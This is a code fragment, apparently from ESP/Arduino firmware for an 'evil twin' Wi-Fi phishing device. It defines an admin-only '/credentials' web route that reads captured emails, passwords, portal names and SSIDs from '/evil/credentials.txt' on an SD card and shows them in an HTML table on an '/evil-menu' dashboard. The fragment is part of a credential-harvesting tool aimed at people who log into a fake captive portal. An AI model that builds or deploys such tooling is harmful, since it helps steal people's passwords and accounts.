  server.on("/credentials", HTTP_GET, []() {
    if (!guardAdmin()) return;
    File file = SD.open("/evil/credentials.txt");
    if (!file) {
      String c = F("<p>File not found.</p><div class='actions'><a class='btn' href='/evil-menu'>Back</a></div>");
      server.send(404, "text/html", wrapAdminPage("Credentials", c));
      return;
    }
    if (file.size() == 0) {
      String c = F("<p>No credentials captured yet.</p><div class='actions'><a class='btn' href='/evil-menu'>Back</a></div>");
      server.send(200, "text/html", wrapAdminPage("Credentials", c));
      file.close();
      return;
    }
    String content;
    content.reserve(2048);
    content += F("<div style='overflow-x:auto'><table style='width:100%;border-collapse:collapse'>");
    content += F("<tr style='background:rgba(255,255,255,.1)'><th style='padding:8px;text-align:left'>Email</th><th style='padding:8px;text-align:left'>Password</th><th style='padding:8px;text-align:left'>Portal</th><th style='padding:8px;text-align:left'>SSID</th></tr>");
    enum { NONE, EMAIL_NEXT, PASS_NEXT, PORTAL_NEXT, SSID_NEXT } st = NONE;
    String em="", pw="", pt="", sd="";
    int rows = 0;
    while (file.available()) {
      String line = file.readStringUntil('\n');
      line.trim();
      if (line.length() == 0) continue;
      if (line.startsWith("-- Email"))    { st = EMAIL_NEXT;  continue; }
      if (line.startsWith("-- Password")) { st = PASS_NEXT;   continue; }
      if (line.startsWith("-- Portal"))   { st = PORTAL_NEXT; continue; }
      if (line.startsWith("-- SSID"))     { st = SSID_NEXT;   continue; }
      if (line.startsWith("---")) {
        if (em.length() || pw.length() || pt.length() || sd.length()) {
          content += F("<tr style='border-bottom:1px solid rgba(255,255,255,.08)'><td style='padding:6px'>");
          content += htmlEscape(em); content += F("</td><td style='padding:6px'>");
          content += htmlEscape(pw); content += F("</td><td style='padding:6px'>");
          content += htmlEscape(pt); content += F("</td><td style='padding:6px'>");
          content += htmlEscape(sd); content += F("</td></tr>");
          rows++;
        }
        em=""; pw=""; pt=""; sd=""; st = NONE;
        continue;
      }
      switch (st) {
        case EMAIL_NEXT:  em = line; st = NONE; break;
        case PASS_NEXT:   pw = line; st = NONE; break;
        case PORTAL_NEXT: pt = line; st = NONE; break;
        case SSID_NEXT:   sd = line; st = NONE; break;
        default: break;
      }
    }
    // Flush last record
    if (em.length() || pw.length() || pt.length() || sd.length()) {
      content += F("<tr style='border-bottom:1px solid rgba(255,255,255,.08)'><td style='padding:6px'>");
      content += htmlEscape(em); content += F("</td><td style='padding:6px'>");
      content += htmlEscape(pw); content += F("</td><td style='padding:6px'>");
      content += htmlEscape(pt); content += F("</td><td style='padding:6px'>");
      content += htmlEscape(sd); content += F("</td></tr>");
      rows++;
    }
    content += F("</table></div>");
    content += "<p style='color:#7a8ba8;margin-top:12px'>" + String(rows) + " record(s)</p>";
    content += F("<div style='margin-top:12px'><a href='/evil-menu' style='color:#4c7dff'>Back to Dashboard</a></div>");
    file.close();
    server.send(200, "text/html", wrapAdminPage("Credentials", content));
  });


